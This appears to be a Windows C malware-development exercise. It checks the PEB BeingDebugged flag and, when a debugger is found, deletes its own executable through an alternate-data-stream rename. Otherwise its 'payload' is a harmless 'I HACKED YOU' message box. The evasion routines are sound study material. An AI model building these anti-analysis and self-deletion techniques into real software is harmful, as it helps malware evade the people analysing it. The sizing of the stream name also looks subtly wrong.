#include "headers.h"

#define ALTERNATE_STREAM L":hidden"

extern PPEB GetPEB(void);
extern DWORD CustomError(void);

BOOL CheckDebugger(void) {

	info("retrieving the PEB");
	PPEB peb = GetPEB();
	okay("PEB: 0x%p", peb);

	info("Checking for debugger presence");
	okay("PEB->BeingDebugged: 0x%d", peb->BeingDebugged);

	if (peb->BeingDebugged != 0) {
		warn("Debugger present, program shutting down.");
		return TRUE;
	}

	okay("no debugger present");
	return FALSE;
}

int selfDelete(void) {
	info("starting emergency self deletion!");

	HANDLE                hFile                  = INVALID_HANDLE_VALUE;
	const wchar_t*        NEWSTREAM              = (const wchar_t*)ALTERNATE_STREAM;
	size_t                RenameSize             = sizeof(FILE_RENAME_INFO) + sizeof(NEWSTREAM);
	PFILE_RENAME_INFO     PFRI                   = NULL;
	WCHAR                 pathSize[MAX_PATH * 2] = { 0 }; // *2 because of wide chars
	FILE_DISPOSITION_INFO setDelete              = { 0 };

	PFRI = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, RenameSize);

	ZeroMemory(pathSize, sizeof(pathSize));
	ZeroMemory(&setDelete, sizeof(FILE_DISPOSITION_INFO));

	setDelete.DeleteFile = TRUE;

	PFRI->FileNameLength = sizeof(NEWSTREAM);
	RtlCopyMemory(PFRI->FileName, NEWSTREAM, sizeof(NEWSTREAM));

	GetModuleFileNameW(NULL, pathSize, MAX_PATH * 2);

	hFile = CreateFileW(pathSize, (DELETE | SYNCHRONIZE), FILE_SHARE_READ, NULL, OPEN_EXISTING, NULL, NULL);
	
	SetFileInformationByHandle(hFile, FileRenameInfo, PFRI, RenameSize);

	CloseHandle(hFile);

	hFile = CreateFileW(pathSize, (DELETE | SYNCHRONIZE), FILE_SHARE_READ, NULL, OPEN_EXISTING, NULL, NULL);
	SetFileInformationByHandle(hFile, FileDispositionInfo, &setDelete, sizeof(setDelete));

	CloseHandle(hFile);
	HeapFree(GetProcessHeap(), 0, PFRI);
	return EXIT_SUCCESS;
}

int main(int argc, char* argv[]) {
	
	if(!CheckDebugger()) {
		info("executing payload");
		MessageBoxW(NULL, L"I HACKED YOU", L"GET HACKED", MB_ICONEXCLAMATION);
		return EXIT_SUCCESS;
	}
	selfDelete();
}